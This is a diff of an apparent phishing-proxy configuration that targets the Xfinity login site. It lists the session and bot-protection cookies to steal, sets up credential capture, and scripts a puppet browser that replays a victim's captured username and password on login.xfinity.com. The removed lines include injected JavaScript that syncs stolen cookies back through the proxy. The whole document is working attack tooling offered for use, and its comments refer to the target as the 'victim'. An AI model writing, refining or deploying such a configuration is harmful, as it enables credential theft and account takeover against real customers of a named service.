@@ -20,17 +20,13 @@ sub_filters:
 auth_tokens:
   # Primary session tokens
   - domain: '.xfinity.com'
-    keys: ['XFINITY-SSO', 'xsso', 'SC', 'bid', 'AMCV_*', 's_vi', 's_fid', 's_pers', 's_sess', 'isAuth', 'coax', 'cohsn_xs_id', 'r_hint', 'PSC', 'X-hzfdeCEGvt-z', 'X-hzfdeCEGvt-b', 'X-hzfdeCEGvt-c', 'X-hzfdeCEGvt-d', 'X-hzfdeCEGvt-f']
+    keys: ['XFINITY-SSO', 'xsso', 'SC', 'bid', 'AMCV_*', 's_vi', 's_fid', 's_pers', 's_sess']
   # Akamai bot protection cookies (CRITICAL)
   - domain: '.xfinity.com'
-    keys: ['_abck', 'bm_sz', 'ak_bmsc', 'bm_sv', 'bm_mi', 'AWSALB', 'AWSALBCORS', 'AWSALBTG', 'AWSALBTGCORS', 'OptanonConsent', 'OptanonAlertBoxClosed']
+    keys: ['_abck', 'bm_sz', 'ak_bmsc', 'AWSALB', 'AWSALBCORS', 'AWSALBTG', 'AWSALBTGCORS', 'OptanonConsent', 'OptanonAlertBoxClosed']
   # Additional session cookies
   - domain: '.login.xfinity.com'
-    keys: ['JSESSIONID', 'session_token', 'suAKghhasg', 'gpv_Page', 's_sq', 'last_idp_used']
-
-auth_urls:
-  - '/auth'
-  - '/overview'
+    keys: ['JSESSIONID', 'session_token', 'suAKghhasg', 'gpv_Page', 's_sq']
 
 credentials:
   # Username/Email capture
@@ -82,103 +78,53 @@ credentials:
 puppet:
   enabled: true
   triggers:
-    - id: "xfinity_persistent_login"
+    - id: "xfinity_login"
       enabled: true
-      name: "Xfinity Persistent Login Flow"
+      name: "Xfinity Login Flow"
       domains: ["login.xfinity.com"]
       paths: ["/login"]
-      auto_activate: true # Start puppet as soon as victim lands
+      auto_activate: false
       open_url: "https://login.xfinity.com/login"
       tokens: ["flowId", "flowStateId"]
       extract_cookies: true
       actions:
-        # Initial wait and cookie acceptance
+        # Wait specifically for Prism components to hydrate
         - selector: '.hydrated, prism-input-text, form'
-          post_wait: 5000
-        - selector: '#onetrust-accept-btn-handler, #truste-consent-button'
+          post_wait: 7000
+        # Accept cookies if popup appears (OneTrust banner)
+        - selector: '#onetrust-accept-btn-handler, #truste-consent-button, .accept-cookies, [aria-label="Accept Cookies"]'
           click: true
           timeout: 5000
-          post_wait: 10000
-        
-        # 1. Wait for username and fill it
+          post_wait: 1000
+        # Click to focus the input first
         - selector: 'input#user'
-          wait_cred: 'username' # Pause here until username is captured from victim
+          click: true
+          post_wait: 500
+        # Enter the email and WAIT for validation (AJAX check)
+        - selector: 'input#user'
           value: '{username}'
           required: true
-          timeout: 15000
-          post_wait: 2000
-        - selector: '#sign_in'
-          click: true
-          required: true
-          timeout: 10000
-          post_wait: 10000
-        
-        # 2. Wait for password field and then wait for password value
-        - selector: 'input#passwd'
-          required: true
           timeout: 20000
-          post_wait: 2000
-        - selector: 'input#passwd'
-          wait_cred: 'password' # Pause here until password is captured from victim
-          value: '{password}'
-          required: true
-          timeout: 15000
-          post_wait: 2000
-        
-        # 3. Final submission
+          post_wait: 5000
+        # Click the sign in button explicitly (Retry with correct UA)
         - selector: '#sign_in'
           click: true
           required: true
-          timeout: 10000
-          post_wait: 7000
-        
-        # Wait for the authenticated page or session cookies
-        - selector: '.welcome-message, [href*="/auth"], #overview, .account-info, #user-menu'
-          timeout: 30000
-          post_wait: 5000
+          timeout: 15000
+          post_wait: 10000
+        # Wait for password field to ensure we are on the next page
+        - selector: '#passwd'
+          post_wait: 1000
+          required: true
+          timeout: 15000
 
   interceptors:
     - token: 'flowId'
       url_pattern: '.*'
-      abort: false
+      abort: true
     - token: 'flowStateId'
       url_pattern: '.*'
-      abort: false
-
-# ============================================
-# JS INJECTION FOR COOKIE SYNC
-# ============================================
-
-js_inject:
-  - trigger_domains: ["login.xfinity.com"]
-    trigger_paths: ["/login"]
-    script: |
-      (function() {
-        var sid = "{session_id}";
-        var pollCount = 0;
-        var maxPolls = 20; // Poll for 2 minutes
-        
-        var pollPuppet = function() {
-          if (pollCount >= maxPolls) return;
-          pollCount++;
-          
-          console.log("Polling puppet for cookies (session: " + sid + ")...");
-          var xhr = new XMLHttpRequest();
-          // Any request to /s/{sid}/*.js will trigger puppet cookie injection
-          xhr.open("GET", "/s/" + sid + "/sync.js", true);
-          xhr.onreadystatechange = function() {
-            if (xhr.readyState == 4 && xhr.status == 200) {
-              console.log("Puppet sync successful.");
-              // After sync, if the page was "stuck", the next user action will succeed
-            }
-          };
-          xhr.send();
-          
-          setTimeout(pollPuppet, 6000);
-        };
-        
-        setTimeout(pollPuppet, 2000);
-      })();
+      abort: true
 
 
 # ============================================
